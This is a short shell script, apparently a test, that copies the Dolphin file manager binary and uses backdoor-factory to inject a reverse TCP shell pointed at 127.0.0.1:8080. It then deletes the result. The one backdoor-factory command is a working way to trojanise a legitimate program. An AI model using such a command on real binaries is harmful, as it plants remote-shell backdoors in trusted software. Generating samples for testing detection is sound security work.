#!/bin/sh
##
## bd_tcp_rst.sh
##
## Made by P. Thierry <phil@reseau-libre.net>
##
## Started on  Thu 01 Jun 2017 12:49:11 PM CEST pret
## Last update Thu 01 Jun 2017 01:51:35 PM CEST pret
##

set -e

TEMPDIR=`mktemp -d`

if [ -z "$TEMPDIR" ]; then
  echo "error creating temporary directory for test. leaving..."
  exit 1
fi

cp /usr/bin/dolphin ${TEMPDIR}/dolphin

/usr/bin/backdoor-factory -f ${TEMPDIR}/dolphin -H 127.0.0.1 -P 8080 -s reverse_shell_tcp -o ${TEMPDIR}/caved_dolphin

rm -rf $TEMPDIR 

exit 0
